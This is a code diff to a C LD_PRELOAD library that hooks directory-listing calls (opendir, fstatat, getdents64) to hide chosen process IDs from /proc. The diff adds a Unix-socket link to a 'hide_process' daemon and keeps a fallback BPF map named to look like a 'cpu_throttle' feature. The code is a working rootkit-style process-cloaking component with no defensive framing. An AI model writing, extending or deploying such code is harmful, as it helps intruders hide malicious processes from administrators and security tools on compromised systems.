@@ -15,6 +15,8 @@
 #include <time.h>
 #include <bpf/bpf.h>
 #include <bpf/libbpf.h>
+#include <sys/socket.h>
+#include <sys/un.h>
 
 /* =====================================================
  *  LD_PRELOAD Cloak Library for Proc Filesystem Protection
@@ -25,14 +27,23 @@
 #define MAX_HIDDEN_PIDS 1024
 #define PROC_PATH_PREFIX "/proc/"
 #define BPF_MAP_PATH "/sys/fs/bpf/cpu_throttle/hidden_pid_map"
+#define SOCKET_PATH "/run/hide_process/sock"
 
 /* Global state */
 static int initialized = 0;
 static int hidden_pids[MAX_HIDDEN_PIDS];
 static int hidden_count = 0;
-static int bpf_map_fd = -1;
+static int bpf_map_fd = -1;  /* Fallback for direct access */
+static int socket_fd = -1;   /* Unix socket connection */
 static time_t last_refresh = 0;
 static const int REFRESH_INTERVAL = 5; /* Refresh every 5 seconds */
+
+/* PID list message structure (must match daemon) */
+struct pid_list_msg {
+    uint32_t magic;      /* 0xDEADBEEF */
+    uint32_t count;      /* Number of PIDs */
+    uint32_t pids[MAX_HIDDEN_PIDS];
+};
 
 /* Original function pointers */
 static DIR* (*real_opendir)(const char *name) = NULL;
@@ -53,9 +64,12 @@ static long (*real_getdents64)(int fd, void *dirp, size_t count) = NULL;
  * ===================================================== */
 
 static long filter_getdents64_entries(void *dirp, long bytes_read);
-static void load_hidden_pids_from_bpf_map(void);
-static int open_bpf_map(void);
+static void load_hidden_pids_from_socket(void);
+static void load_hidden_pids_from_bpf_map(void);  /* Fallback */
+static int open_socket_connection(void);
+static int open_bpf_map(void);  /* Fallback */
 static int refresh_hidden_pids_if_needed(void);
+static void close_socket_connection(void);
 static void close_bpf_map(void);
 
 /* =====================================================
@@ -86,6 +100,115 @@ static void close_bpf_map(void) {
     }
 }
 
+/* =====================================================
+ *  Unix Socket Communication Functions
+ * ===================================================== */
+
+/* Open Unix socket connection to daemon */
+static int open_socket_connection(void) {
+    struct sockaddr_un addr;
+    int ret;
+
+    if (socket_fd >= 0) {
+        return 0; /* Already connected */
+    }
+
+    /* Create Unix domain socket */
+    socket_fd = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (socket_fd < 0) {
+        return -1;
+    }
+
+    /* Setup address */
+    memset(&addr, 0, sizeof(addr));
+    addr.sun_family = AF_UNIX;
+    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);
+
+    /* Connect to daemon */
+    ret = connect(socket_fd, (struct sockaddr*)&addr, sizeof(addr));
+    if (ret < 0) {
+        close(socket_fd);
+        socket_fd = -1;
+        return -1;
+    }
+
+    return 0;
+}
+
+/* Close socket connection */
+static void close_socket_connection(void) {
+    if (socket_fd >= 0) {
+        close(socket_fd);
+        socket_fd = -1;
+    }
+}
+
+/* Load hidden PIDs from Unix socket (primary method) */
+static void load_hidden_pids_from_socket(void) {
+    struct pid_list_msg msg;
+    ssize_t received;
+
+    hidden_count = 0;
+
+    /* Try to connect to daemon */
+    if (open_socket_connection() < 0) {
+        /* Daemon not available - fallback to BPF map */
+        load_hidden_pids_from_bpf_map();
+        return;
+    }
+
+    /* Receive PID list from daemon */
+    received = recv(socket_fd, &msg, sizeof(msg), MSG_DONTWAIT);
+    if (received < 0) {
+        if (errno == EAGAIN || errno == EWOULDBLOCK) {
+            /* No data available yet - keep existing list */
+            return;
+        } else {
+            /* Connection error - fallback to BPF map */
+            close_socket_connection();
+            load_hidden_pids_from_bpf_map();
+            return;
+        }
+    }
+
+    /* Validate message */
+    if (received < sizeof(uint32_t) * 2 || msg.magic != 0xDEADBEEF) {
+        /* Invalid message - fallback to BPF map */
+        close_socket_connection();
+        load_hidden_pids_from_bpf_map();
+        return;
+    }
+
+    /* Check message size */
+    size_t expected_size = sizeof(uint32_t) * 2 + sizeof(uint32_t) * msg.count;
+    if (received != expected_size || msg.count > MAX_HIDDEN_PIDS) {
+        /* Invalid message size - fallback to BPF map */
+        close_socket_connection();
+        load_hidden_pids_from_bpf_map();
+        return;
+    }
+
+    /* Copy PIDs to local array */
+    hidden_count = msg.count;
+    for (uint32_t i = 0; i < msg.count; i++) {
+        hidden_pids[i] = (int)msg.pids[i];
+    }
+
+    /* Sort PIDs for binary search optimization */
+    if (hidden_count > 1) {
+        /* Simple bubble sort for small arrays */
+        for (int i = 0; i < hidden_count - 1; i++) {
+            for (int j = 0; j < hidden_count - i - 1; j++) {
+                if (hidden_pids[j] > hidden_pids[j + 1]) {
+                    int temp = hidden_pids[j];
+                    hidden_pids[j] = hidden_pids[j + 1];
+                    hidden_pids[j + 1] = temp;
+                }
+            }
+        }
+    }
+}
+
 /* Refresh hidden PIDs if needed (time-based with optimization) */
 static int refresh_hidden_pids_if_needed(void) {
     time_t current_time = time(NULL);
@@ -98,8 +221,8 @@ static int refresh_hidden_pids_if_needed(void) {
     /* Update last refresh time */
     last_refresh = current_time;
 
-    /* Reload PIDs from BPF map */
-    load_hidden_pids_from_bpf_map();
+    /* Reload PIDs from Unix socket (primary) or BPF map (fallback) */
+    load_hidden_pids_from_socket();
 
     return 1; /* Refresh performed */
 }
@@ -122,9 +245,9 @@ static void init_libhide(void) {
     real_fstatat = dlsym(RTLD_NEXT, "fstatat");
     real_getdents64 = dlsym(RTLD_NEXT, "getdents64");
     
-    /* Load hidden PIDs from BPF map */
-    load_hidden_pids_from_bpf_map();
-    
+    /* Load hidden PIDs from Unix socket (primary) or BPF map (fallback) */
+    load_hidden_pids_from_socket();
+
     initialized = 1;
 }
 
@@ -535,6 +658,7 @@ void libhide_init(void) {
 
 __attribute__((destructor))
 void libhide_cleanup(void) {
-    /* Close BPF map file descriptor */
+    /* Close socket connection and BPF map file descriptor */
+    close_socket_connection();
     close_bpf_map();
 }
